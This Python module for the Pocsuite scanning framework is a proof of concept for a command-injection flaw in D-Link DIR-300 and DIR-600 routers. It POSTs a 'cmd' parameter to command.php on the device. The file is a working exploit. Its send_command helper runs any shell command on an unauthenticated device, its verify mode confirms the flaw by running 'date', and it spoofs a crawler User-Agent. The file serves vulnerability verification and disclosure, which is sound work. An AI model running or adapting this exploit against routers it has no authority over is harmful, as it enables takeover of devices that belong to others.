#!/usr/bin/python
# -*- coding: utf-8 -*-


# If you have issues about development, please read:
# https://github.com/knownsec/Pocsuite/blob/master/docs/CODING.md
# https://github.com/knownsec/Pocsuite/blob/master/docs/COPYING

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


def send_command(url, cmd):
    try:
        httpreq = req.Session()
        headers = {'Content-Type': 'application/x-www-form-urlencoded',
                   'User-Agent': 'GoogleSpider'}
        resp = httpreq.post(url, headers=headers, data='cmd=%s' % cmd)
    except:
        resp = None
    return resp


class TestPOC(POCBase):
    name = 'Multiple Vulnerabilities in D-Link DIR-600 and DIR-300'
    vulID = '78176'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['debug']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''The vulnerability is caused by missing access
           restrictions and missing input validation in the cmd
           parameter (command.php) and can be exploited to inject
           and execute arbitrary shell commands.'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'D-Link'
    appVersion = 'DIR-300, DIR-600'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        self.url = self.url + '/command.php'

        resp = send_command(self.url, 'date +%Y%m%d')
        if resp and resp.text and resp.status_code == 200:
            date = resp.text.strip()
            if len(date) == 8 and date.isdigit():
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
